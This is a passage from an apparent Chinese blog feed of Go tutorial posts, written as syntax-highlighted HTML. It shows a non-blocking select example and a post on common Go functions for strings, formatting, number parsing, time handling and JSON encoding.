class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常规的通过通道发送和接收数据是阻塞的。</span></span><br><span class="line"><span class="comment">// 然而，我们可以使用带一个 default 子句的 select 来实现非阻塞 的发送、接收，甚至是非阻塞的多路 select。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">signals := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"><span class="comment">// 这里是一个非阻塞接收的例子。</span></span><br><span class="line"><span class="comment">// 如果在 messages 中存在，然后 select 将这个值带入 &lt;-messages case中。</span></span><br><span class="line"><span class="comment">// 如果不是，就直接到 default 分支中。</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> msg := &lt;-messages:</span><br><span class="line">fmt.Println(<span class="string">&quot;received message&quot;</span>, msg)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;no message received&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个非阻塞发送的实现方法和上面一样。</span></span><br><span class="line">msg := <span class="string">&quot;hi&quot;</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> messages &lt;- msg:</span><br><span class="line">fmt.Println(<span class="string">&quot;sent message&quot;</span>, msg)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;no message sent&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们可以在 default 前使用多个 case 子句来实现一个多路的非阻塞的选择器。</span></span><br><span class="line"><span class="comment">// 这里我们试图在 messages和 signals 上同时使用非阻塞的接受操作。</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> msg := &lt;-messages:</span><br><span class="line">fmt.Println(<span class="string">&quot;received message&quot;</span>, msg)</span><br><span class="line"><span class="keyword">case</span> sig := &lt;-signals:</span><br><span class="line">fmt.Println(<span class="string">&quot;received signal&quot;</span>, sig)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;no activity&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang常用方法</title>
      <link href="/2025/03/05/golang%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2025/03/05/golang%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="golang常用方法"><a href="#golang常用方法" class="headerlink" title="golang常用方法"></a>golang常用方法</h1><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> s <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="comment">// 我们给 fmt.Println 一个短名字的别名，我们随后将会经常用到。</span></span><br><span class="line"><span class="keyword">var</span> p = fmt.Println</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标准库的 strings 包提供了很多有用的字符串相关的函数。</span></span><br><span class="line"><span class="comment">// 这里是一些用来让你对这个包有个初步了解的例子。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 这是一些 strings 中的函数例子。</span></span><br><span class="line"><span class="comment">// 注意他们都是包中的函数，不是字符串对象自身的方法，这意味着我们需要考虑在调用时传递字符作为第一个参数进行传递。</span></span><br><span class="line">p(<span class="string">&quot;Contains:  &quot;</span>, s.Contains(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;es&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;Count:     &quot;</span>, s.Count(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;t&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;HasPrefix: &quot;</span>, s.HasPrefix(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;te&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;HasSuffix: &quot;</span>, s.HasSuffix(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;st&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;Index:     &quot;</span>, s.Index(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;e&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;Join:      &quot;</span>, s.Join([]<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>&#125;, <span class="string">&quot;-&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;Repeat:    &quot;</span>, s.Repeat(<span class="string">&quot;a&quot;</span>, <span class="number">5</span>))</span><br><span class="line">p(<span class="string">&quot;Replace:   &quot;</span>, s.Replace(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="number">-1</span>))</span><br><span class="line">p(<span class="string">&quot;Replace:   &quot;</span>, s.Replace(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="number">1</span>))</span><br><span class="line">p(<span class="string">&quot;Split:     &quot;</span>, s.Split(<span class="string">&quot;a-b-c-d-e&quot;</span>, <span class="string">&quot;-&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;ToLower:   &quot;</span>, s.ToLower(<span class="string">&quot;TEST&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;ToUpper:   &quot;</span>, s.ToUpper(<span class="string">&quot;test&quot;</span>))</span><br><span class="line"><span class="comment">// 你可以在 strings包文档中找到更多的函数</span></span><br><span class="line">p()</span><br><span class="line"><span class="comment">// 虽然不是 strings 的一部分，但是仍然值得一提的是获取字符串长度和通过索引获取一个字符的机制。</span></span><br><span class="line">p(<span class="string">&quot;Len: &quot;</span>, <span class="built_in">len</span>(<span class="string">&quot;hello&quot;</span>))</span><br><span class="line">p(<span class="string">&quot;Char:&quot;</span>, <span class="string">&quot;hello&quot;</span>[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> point <span class="keyword">struct</span> &#123;</span><br><span class="line">x, y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Go 为常规 Go 值的格式化设计提供了多种打印方式。例如，这里打印了 point 结构体的一个实例。</span></span><br><span class="line">p := point&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, p)</span><br><span class="line"><span class="comment">// 如果值是一个结构体，%+v 的格式化输出内容将包括结构体的字段名。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%+v\n&quot;</span>, p)</span><br><span class="line"><span class="comment">// %#v 形式则输出这个值的 Go 语法表示。例如，值的运行源代码片段。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%#v\n&quot;</span>, p)</span><br><span class="line"><span class="comment">// 需要打印值的类型，使用 %T。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, p)</span><br><span class="line"><span class="comment">// 格式化布尔值是简单的。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%t\n&quot;</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="comment">// 格式化整形数有多种方式，使用 %d进行标准的十进制格式化。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, <span class="number">123</span>)</span><br><span class="line"><span class="comment">// 这个输出二进制表示形式。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%b\n&quot;</span>, <span class="number">14</span>)</span><br><span class="line"><span class="comment">// 这个输出给定整数的对应字符。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%c\n&quot;</span>, <span class="number">33</span>)</span><br><span class="line"><span class="comment">// %x 提供十六进制编码。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%x\n&quot;</span>, <span class="number">456</span>)</span><br><span class="line"><span class="comment">// 对于浮点型同样有很多的格式化选项。使用 %f 进行最基本的十进制格式化。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%f\n&quot;</span>, <span class="number">78.9</span>)</span><br><span class="line"><span class="comment">// %e 和 %E 将浮点型格式化为（稍微有一点不同的）科学技科学记数法表示形式。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%e\n&quot;</span>, <span class="number">123400000.0</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%E\n&quot;</span>, <span class="number">123400000.0</span>)</span><br><span class="line"><span class="comment">// 使用 %s 进行基本的字符串输出。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;\&quot;string\&quot;&quot;</span>)</span><br><span class="line"><span class="comment">// 像 Go 源代码中那样带有双引号的输出，使用 %q。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%q\n&quot;</span>, <span class="string">&quot;\&quot;string\&quot;&quot;</span>)</span><br><span class="line"><span class="comment">// 和上面的整形数一样，%x 输出使用 base-16 编码的字符串，每个字节使用 2 个字符表示。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%x\n&quot;</span>, <span class="string">&quot;hex this&quot;</span>)</span><br><span class="line"><span class="comment">// 要输出一个指针的值，使用 %p。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;p)</span><br><span class="line"><span class="comment">// 当输出数字的时候，你将经常想要控制输出结果的宽度和精度，可以使用在 % 后面使用数字来控制输出宽度。</span></span><br><span class="line"><span class="comment">// 默认结果使用右对齐并且通过空格来填充空白部分。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;|%6d|%6d|\n&quot;</span>, <span class="number">12</span>, <span class="number">345</span>)</span><br><span class="line"><span class="comment">// 你也可以指定浮点型的输出宽度，同时也可以通过 宽度.精度 的语法来指定输出的精度。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;|%6.2f|%6.2f|\n&quot;</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"><span class="comment">// 要左对齐，使用 - 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;|%-6.2f|%-6.2f|\n&quot;</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"><span class="comment">// 你也许也想控制字符串输出时的宽度，特别是要确保他们在类表格输出时的对齐。</span></span><br><span class="line"><span class="comment">// 这是基本的右对齐宽度表示。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;|%6s|%6s|\n&quot;</span>, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">// 要左对齐，和数字一样，使用 - 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;|%-6s|%-6s|\n&quot;</span>, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">// 到目前为止，我们已经看过 Printf了，它通过 os.Stdout输出格式化的字符串。</span></span><br><span class="line"><span class="comment">// Sprintf 则格式化并返回一个字符串而不带任何输出。</span></span><br><span class="line">s := fmt.Sprintf(<span class="string">&quot;a %s&quot;</span>, <span class="string">&quot;string&quot;</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line"><span class="comment">// 你可以使用 Fprintf 来格式化并输出到 io.Writers而不是 os.Stdout。</span></span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">&quot;an %s\n&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数字转换"><a href="#数字转换" class="headerlink" title="数字转换"></a>数字转换</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从字符串中解析数字在很多程序中是一个基础常见的任务，在Go 中是这样处理的。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 内置的 strconv 包提供了数字解析功能。</span></span><br><span class="line"><span class="comment">// 使用 ParseFloat 解析浮点数，这里的 64 表示表示解析的数的位数。</span></span><br><span class="line">f, _ := strconv.ParseFloat(<span class="string">&quot;1.234&quot;</span>, <span class="number">64</span>)</span><br><span class="line">fmt.Println(f)</span><br><span class="line"><span class="comment">// 在使用 ParseInt 解析整形数时，例子中的参数 0 表示自动推断字符串所表示的数字的进制。</span></span><br><span class="line"><span class="comment">// 64 表示返回的整形数是以 64 位存储的。</span></span><br><span class="line">i, _ := strconv.ParseInt(<span class="string">&quot;123&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">fmt.Println(i)</span><br><span class="line"><span class="comment">// ParseInt 会自动识别出十六进制数。</span></span><br><span class="line">d, _ := strconv.ParseInt(<span class="string">&quot;0x1c8&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">fmt.Println(d)</span><br><span class="line"><span class="comment">// ParseUint 也是可用的。</span></span><br><span class="line">u, _ := strconv.ParseUint(<span class="string">&quot;789&quot;</span>, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">fmt.Println(u)</span><br><span class="line"><span class="comment">// Atoi 是一个基础的 10 进制整型数转换函数。</span></span><br><span class="line">k, _ := strconv.Atoi(<span class="string">&quot;135&quot;</span>)</span><br><span class="line">fmt.Println(k)</span><br><span class="line"><span class="comment">// 在输入错误时，解析函数会返回一个错误。</span></span><br><span class="line">_, e := strconv.Atoi(<span class="string">&quot;wat&quot;</span>)</span><br><span class="line">fmt.Println(e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := fmt.Println</span><br><span class="line"><span class="comment">// 得到当前时间。</span></span><br><span class="line">now := time.Now()</span><br><span class="line">p(now)</span><br><span class="line"><span class="comment">// 通过提供年月日等信息，你可以构建一个 time。时间总是关联着位置信息，例如时区。</span></span><br><span class="line">then := time.Date(</span><br><span class="line"><span class="number">2009</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">34</span>, <span class="number">58</span>, <span class="number">651387237</span>, time.UTC)</span><br><span class="line">p(then)</span><br><span class="line"><span class="comment">// 你可以提取出时间的各个组成部分。</span></span><br><span class="line">p(then.Year())</span><br><span class="line">p(then.Month())</span><br><span class="line">p(then.Day())</span><br><span class="line">p(then.Hour())</span><br><span class="line">p(then.Minute())</span><br><span class="line">p(then.Second())</span><br><span class="line">p(then.Nanosecond())</span><br><span class="line">p(then.Location())</span><br><span class="line"><span class="comment">// 输出是星期一到日的 Weekday 也是支持的。</span></span><br><span class="line">p(then.Weekday())</span><br><span class="line"><span class="comment">// 这些方法来比较两个时间，分别测试一下是否是之前，之后或者是同一时刻，精确到秒。</span></span><br><span class="line">p(then.Before(now))</span><br><span class="line">p(then.After(now))</span><br><span class="line">p(then.Equal(now))</span><br><span class="line"><span class="comment">// 方法 Sub 返回一个 Duration 来表示两个时间点的间隔时间。</span></span><br><span class="line">diff := now.Sub(then)</span><br><span class="line">p(diff)</span><br><span class="line"><span class="comment">// 我们计算出不同单位下的时间长度值。</span></span><br><span class="line">p(diff.Hours())</span><br><span class="line">p(diff.Minutes())</span><br><span class="line">p(diff.Seconds())</span><br><span class="line">p(diff.Nanoseconds())</span><br><span class="line"><span class="comment">// 你可以使用 Add 将时间后移一个时间间隔，或者使用一个 - 来将时间前移一个时间间隔。</span></span><br><span class="line">p(then.Add(diff))</span><br><span class="line">p(then.Add(-diff))</span><br><span class="line"></span><br><span class="line">p(<span class="string">&quot;################&quot;</span>)</span><br><span class="line"><span class="comment">// 格式化</span></span><br><span class="line"><span class="comment">// 这里是一个基本的按照 RFC3339 进行格式化的例子，使用对应模式常量。</span></span><br><span class="line">t := time.Now()</span><br><span class="line">p(t.Format(time.RFC3339))</span><br><span class="line"><span class="comment">// 时间解析使用同 Format 相同的形式值。</span></span><br><span class="line">t1, e := time.Parse(</span><br><span class="line">time.RFC3339,</span><br><span class="line"><span class="string">&quot;2012-11-01T22:08:41+00:00&quot;</span>)</span><br><span class="line">p(t1)</span><br><span class="line"><span class="comment">// ormat 和 Parse 使用基于例子的形式来决定日期格式，</span></span><br><span class="line"><span class="comment">// 一般你只要使用 time 包中提供的模式常量就行了，但是你也可以实现自定义模式。</span></span><br><span class="line"><span class="comment">// 模式必须使用时间 Mon Jan 2 15:04:05 MST 2006来指定给定时间/字符串的格式化/解析方式。</span></span><br><span class="line"><span class="comment">// 时间一定要按照如下所示：2006为年，15 为小时，Monday 代表星期几，等等。</span></span><br><span class="line">p(t.Format(<span class="string">&quot;3:04PM&quot;</span>))</span><br><span class="line">p(t.Format(<span class="string">&quot;Mon Jan _2 15:04:05 2006&quot;</span>))</span><br><span class="line">p(t.Format(<span class="string">&quot;2006-01-02T15:04:05.999999-07:00&quot;</span>))</span><br><span class="line">form := <span class="string">&quot;3 04 PM&quot;</span></span><br><span class="line">t2, e := time.Parse(form, <span class="string">&quot;8 41 PM&quot;</span>)</span><br><span class="line">p(t2)</span><br><span class="line"><span class="comment">// 对于纯数字表示的时间，你也可以使用标准的格式化字符串来提出出时间值得组成。</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d-%02d-%02dT%02d:%02d:%02d-00:00\n&quot;</span>,</span><br><span class="line">t.Year(), t.Month(), t.Day(),</span><br><span class="line">t.Hour(), t.Minute(), t.Second())</span><br><span class="line"><span class="comment">// Parse 函数在输入的时间格式不正确是会返回一个错误。</span></span><br><span class="line">ansic := <span class="string">&quot;Mon Jan _2 15:04:05 2006&quot;</span></span><br><span class="line">_, e = time.Parse(ansic, <span class="string">&quot;8:41PM&quot;</span>)</span><br><span class="line">p(e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSON转换"><a href="#JSON转换" class="headerlink" title="JSON转换"></a>JSON转换</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面我们将使用这两个结构体来演示自定义类型的编码和解码。</span></span><br><span class="line"><span class="keyword">type</span> Response1 <span class="keyword">struct</span> &#123;</span><br><span class="line">Page   <span class="type">int</span></span><br><span class="line">Fruits []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Response2 <span class="keyword">struct</span> &#123;</span><br><span class="line">Page   <span class="type">int</span>      <span class="string">`json:&quot;page&quot;`</span></span><br><span class="line">Fruits []<span class="type">string</span> <span class="string">`json:&quot;fruits&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 首先我们来看一下基本数据类型到 JSON 字符串的编码过程。这里是一些原子值的例子。</span></span><br><span class="line">bolB, _ := json.Marshal(<span class="literal">true</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(bolB))</span><br><span class="line">intB, _ := json.Marshal(<span class="number">1</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(intB))</span><br><span class="line">fltB, _ := json.Marshal(<span class="number">2.34</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(fltB))</span><br><span class="line">strB, _ := json.Marshal(<span class="string">&quot;gopher&quot;</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(strB))</span><br><span class="line"><span class="comment">// 这里是一些切片和 map 编码成 JSON 数组和对象的例子。</span></span><br><span class="line">slcD := []<span class="type">string</span>&#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;peach&quot;</span>, <span class="string">&quot;pear&quot;</span>&#125;</span><br><span class="line">slcB, _ := json.Marshal(slcD)</span><br><span class="line">fmt.Println(<span class="type">string</span>(slcB))</span><br><span class="line">mapD := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;apple&quot;</span>: <span class="number">5</span>, <span class="string">&quot;lettuce&quot;</span>: <span class="number">7</span>&#125;</span><br><span class="line">mapB, _ := json.Marshal(mapD)</span><br><span class="line">fmt.Println(<span class="type">string</span>(mapB))</span><br><span class="line"><span class="comment">// JSON 包可以自动的编码你的自定义类型。</span></span><br><span class="line"><span class="comment">// 编码仅输出可导出的字段，并且默认使用他们的名字作为 JSON 数据的键。</span></span><br><span class="line">res1D := &amp;Response1&#123;</span><br><span class="line">Page:   <span class="number">1</span>,</span><br><span class="line">Fruits: []<span class="type">string</span>&#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;peach&quot;</span>, <span class="string">&quot;pear&quot;</span>&#125;&#125;</span><br><span class="line">res1B, _ := json.Marshal(res1D)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res1B))</span><br><span class="line"><span class="comment">// 你可以给结构字段声明标签来自定义编码的 JSON 数据键名称。</span></span><br><span class="line"><span class="comment">// 在上面 Response2 的定义可以作为这个标签这个的一个例子。</span></span><br><span class="line">res2D := &amp;Response2&#123;</span><br><span class="line">Page:   <span class="number">1</span>,</span><br><span class="line">Fruits: []<span class="type">string</span>&#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;peach&quot;</span>, <span class="string">&quot;pear&quot;</span>&#125;&#125;</span><br><span class="line">res2B, _ := json.Marshal(res2D)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res2B))</span><br><span class="line"><span class="comment">// 现在来看看解码 JSON 数据为 Go 值的过程。</span></span><br><span class="line"><span class="comment">// 这里是一个普通数据结构的解码例子。</span></span><br><span class="line">byt := []<span class="type">byte</span>(<span 